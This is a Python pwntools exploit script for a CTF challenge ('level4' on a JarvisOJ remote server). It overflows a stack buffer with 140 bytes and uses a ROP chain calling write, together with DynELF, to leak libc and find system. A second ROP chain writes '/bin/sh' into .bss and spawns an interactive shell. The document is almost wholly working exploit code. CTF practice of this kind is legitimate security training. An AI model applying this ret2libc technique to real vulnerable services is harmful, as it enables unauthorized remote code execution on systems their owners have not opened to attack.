#!/usr/bin/env python
# -*- encoding: utf-8 -*-
__author__ = 'Albertchang'

from pwn import *
context.log_level = "debug"
DEBUG = 0
LOCAL = 0
if LOCAL == 1:
            p = process('./level4.0f9cfa0b7bb6c0f9e030a5541b46e9f0')
else:
            #p = remote('127.0.0.1',6666)
            p = remote('pwn2.jarvisoj.com',9880)

elf = ELF('./level4.0f9cfa0b7bb6c0f9e030a5541b46e9f0')
plt_write = elf.symbols['write']
plt_read = elf.symbols['read']
got_read = elf.got['read']
vulfun_addr = 0x0804844B
main_addr = 0x08048470
def leak(address):
    payload1 = 'a'*140 + p32(plt_write) + p32(main_addr) + p32(1) +p32(address) + p32(4)
    p.send(payload1)
    # print p.recv()
    data = p.recv(4)
    # print p.recv()
    log.debug("%#x => %s" % (address, (data or '').encode('hex')))
    return data

# print leak(got_read)
raw_input("go?")
d = DynELF(leak, elf=ELF('./level4.0f9cfa0b7bb6c0f9e030a5541b46e9f0'))
system_addr = d.lookup('system', 'libc')
print "system_addr=" + hex(system_addr)

# payload = 'a'*140 + p32(main_addr)
# p.send(payload)
# print p.recv(1024)
# ida中直接可以看到
bss_addr = elf.bss()
# bss_addr = 0x0804a024
# objdump -d level2 | grep pop -C5
pppr = 0x8048509

payload2 = 'a'*140  + p32(plt_read) + p32(pppr) + p32(0) + p32(bss_addr) + p32(8) + p32(system_addr) + p32(vulfun_addr) + p32(bss_addr)
#ss = raw_input()

if DEBUG == 1:
        context.terminal = ['gnome-terminal', '-x', 'zsh', '-c']
        gdb.attach(proc.pidof(p)[0])
print "\n###sending payload2###"
p.send(payload2)
p.send("/bin/sh\x00")
p.interactive()
